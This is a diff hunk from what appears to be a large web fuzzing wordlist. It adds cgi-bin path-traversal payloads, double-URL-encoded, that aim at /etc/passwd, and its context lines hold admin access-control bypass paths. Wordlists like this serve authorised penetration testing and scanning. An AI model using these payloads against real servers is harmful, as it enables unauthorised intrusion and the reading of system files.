@@ -30772,7 +30772,11 @@ admin?access=1
 /blablabal/..;/admin
 /blablabal/;/admin
 /blablabal/admin/..;/
-/admin?access=1  
+/admin?access=1
+cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd
+cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd
+cgi-bin/.%%32e/.%%32e/.%%32e/.%%32e/etc/passwd
+cgi-bin/.%2%65/.%2%65/.%2%65/.%2%65/etc/passwd
 /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd
 /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd
 /cgi-bin/.%%32e/.%%32e/.%%32e/.%%32e/etc/passwd
